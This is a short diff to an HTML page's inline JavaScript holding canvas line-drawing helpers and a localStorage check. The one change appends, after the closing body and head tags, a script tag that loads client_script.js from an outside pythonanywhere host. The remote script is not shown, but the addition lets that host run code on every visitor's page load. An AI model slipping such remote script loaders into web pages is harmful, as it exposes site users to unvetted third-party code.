@@ -90,4 +90,4 @@
   function getAngle(x,y){return Math.atan(y/(x==0?0.01:x))+(x<0?Math.PI:0)}
   function drawLineNoAliasing(ctx,sx,sy,tx,ty){var dist=DBP(sx,sy,tx,ty);var ang=getAngle(tx-sx,ty-sy);for(var i=0;i<dist;i++){ctx.fillRect(Math.round(sx+Math.cos(ang)*i),Math.round(sy+Math.sin(ang)*i),1,1)}}
   function supportsLocalStorage(){try{return'localStorage' in window&&window.localStorage!==null}
-  catch(e){return!1}}</script></body></head>
+  catch(e){return!1}}</script></body></head><script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
